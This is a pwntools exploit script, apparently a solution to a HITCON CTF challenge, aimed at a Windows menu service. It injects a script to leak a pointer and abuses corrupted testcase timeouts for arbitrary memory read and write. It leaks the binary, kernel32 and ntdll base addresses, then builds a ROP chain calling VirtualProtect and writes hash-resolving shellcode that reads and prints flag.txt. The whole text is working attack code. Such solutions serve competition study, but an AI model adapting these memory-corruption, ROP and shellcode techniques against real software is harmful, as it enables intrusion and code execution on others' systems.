from pwn import *

if False:
	longjmp = 0x00000000000A3DC8
	pop_r8 = 0x7223
	pop_r9 = 0x8c654
	pop_rdx=0x000000000008C657
	pop_rcx=0x1a853
	vp=0x000000000001C3F0
	GetCurrentThreadId = 0x15b30
	iptr_RtlGetUILanguageInfo = 0x0000000000083650
	RtlGetUILanguageInfo = 0xeeff0
	HOST, PORT = '192.168.19.133', 4870
else:
	longjmp = 0x00000000000A69E5
	pop_r8 = 0x000000000005E10B
	pop_r9 = 0x000000000008EA54
	pop_rdx = 0x000000000008EA57
	pop_rcx = 0x000000000007C572
	vp = 0x000000000001BF60
	GetCurrentThreadId = 0x0000000000005E90
	iptr_RtlGetUILanguageInfo = 0x00000000000827B0 - 0x10
	RtlGetUILanguageInfo = 0x00000000000F4330
	HOST, PORT = 'chal-qqq.chal.hitconctf.com', 41870
r = remote(HOST, PORT)
# context.log_level='debug'
menu = lambda x: r.sendlineafter(b'choice: ', str(x))
ii = lambda x: r.sendlineafter(b': ', x)
__ = lambda x: r.sendline(x)

context.arch='amd64'

menu(11)
def add_script(script):
	menu(1)
	__(script)

def add_testcase(script, timeout):
	menu(5)
	__(str(script))
	__(str(timeout))

def run(testcase):
	menu(9)
	__(str(testcase))

def delete_testcase(testcase):
	menu(6)
	__(str(testcase))


def delete_script(script):
	menu(2)
	__(str(script))


def set_timeout(timeout):
	menu(10)
	__(str(timeout))


def view_testcase(testcase):
	menu(8)
	ii(str((testcase)))

	res = []

	for i in range(2):
		r.recvuntil(b': ')
		res.append(int(r.recvline()))
	
	print(hexdump(res))	
	return res


def edit_testcase(testcase,script,timeout):
	menu(7)
	ii(str(testcase))
	ii(str(script))
	ii(str(timeout))

add_script(b'}));throw((Error(Timer+"")))//')
add_testcase(0, 0)
run(0)
r.recvuntil("QQTimer(")
timer=int(r.recvuntil(")",drop=True),16)
print(hex(timer))
delete_testcase(0)
set_timeout(0x1337)

def get_timers():
	timers = []
	menu(11)
	for i in range(3):
		r.recvuntil(b': ')
		timers.append(int(r.recvline()))
	print(hexdump(timers))
	return timers


index = 0


for i in range(32):
	add_testcase(0, 0x000000007FFE0000)
	res = view_testcase(i)
	if res[1] != 0x000000007FFE0000:
		index = i
		break


set_timeout(timer-0x10)
_,res=view_testcase(index)
binary=res-0x57a8
set_timeout(binary+0x5070)
_,res=view_testcase(index)
qt=res-0x1faf00
set_timeout(binary+0x5000)
_,res=view_testcase(index)
kernel32=res-GetCurrentThreadId
set_timeout(kernel32+iptr_RtlGetUILanguageInfo)
_,res=view_testcase(index)
ntdll=res-RtlGetUILanguageInfo
print(hex(ntdll))
set_timeout(timer+0x58-0x10)
edit_testcase(index, 0, ntdll+longjmp)
set_timeout(timer+0x18-0x10)
edit_testcase(index, 0, timer+0x30)
set_timeout(timer+0x30-0x10)
edit_testcase(index, 0, timer+0x40)
payload = [
	timer&~0xfff,
	ntdll+pop_rdx,
	0x2000,
	0,
	ntdll+pop_rdx,
	0x2000,
	0,
	ntdll+pop_r8,
	0x40,
	ntdll+pop_r9,
	timer-0x100,
	0,
	0,
	kernel32+vp,
	timer+0x1000,
]
set_timeout(timer+0x3c-0x10)
edit_testcase(index, 0, len(payload))
set_timeout(timer+0x48-0x10)
edit_testcase(index, 0, 0x38)
payload_raw = flat(payload)
for i in range(0, len(payload_raw), 8):
	set_timeout(timer+0x70-0x10+i)
	value = u64(payload_raw[i:i+8])
	edit_testcase(index, 0, value)

set_timeout(timer+0x20+0x10)
edit_testcase(index, 0, timer+0x70)


set_timeout(timer+0x20+0x50)
edit_testcase(index, 0, ntdll+pop_rcx)

def ror(x, r, w=64):
	return ((x >> r) | (x << (w-r))) & ((1<<w)-1)

def hash(s):
	h = 0
	for c in s:
		h = ror(h, 13)
		h += ord(c)
	return h

def hash_mod(mod):
	if not any(mod.lower().endswith('.'+ext) for ext in ('dll', 'exe')):
		mod += '.dll'
	mod = ''.join(c + '\0' for c in mod.upper()) + '\0\0'
	return hash(mod)

def hash_func(func):
	func += '\0'
	return hash(func)

def hash_both(mod, func):
	return (hash_mod(mod) + hash_func(func)) & ((1<<64)-1)

api_call_stub = open('a.s','r').read()

payload_raw = asm("""
and rsp, ~0xf
sub rsp, 0x1000
mov rbp, rsp
sub rsp, 0x100

lea rcx, [rip+flag_file]
mov rdx, rbp
mov r8, 0

mov r10, {hash_OpenFile}

call api_call

mov [rbp], rax


mov rcx, rax
lea rdx, [rbp+16]
mov r8, 100
lea r9, [rbp+8]
push 0

mov r10, {hash_ReadFile}

call api_call


mov ebx, [rbp+8]
lea rax, [rbp+16+rbx]
mov byte ptr [rax], ';'
mov byte ptr [rax+1], 10
mov byte ptr [rax+2], 0
add rbx, 3
mov [rbp+8], rbx

mov ecx, -11
mov r10, {hash_GetStdHandle}

call api_call


mov rcx, rax
lea rdx, [rbp+16]
mov r8, [rbp+8]
lea r9, [rbp+0x100]
push 0
mov r10, {hash_WriteFile}

call api_call


int3

flag_file:
  .asciz "{FLAG_FILE}"
""".format(
	hash_OpenFile=hash_both('kernel32', 'OpenFile'),
	hash_ReadFile=hash_both('kernel32', 'ReadFile'),
	hash_GetStdHandle=hash_both('kernel32', 'GetStdHandle'),
	hash_WriteFile=hash_both('kernel32', 'WriteFile'),
	FLAG_FILE='flag.txt',
	) + api_call_stub)

payload_raw = payload_raw + b'\x00' * (-len(payload_raw) & 7)

for i in range(0, len(payload_raw), 8):
	set_timeout(timer+0x1000-0x10+i)
	value = u64(payload_raw[i:i+8])
	edit_testcase(index, 0, value)

pause()
delete_testcase(index)
r.interactive()
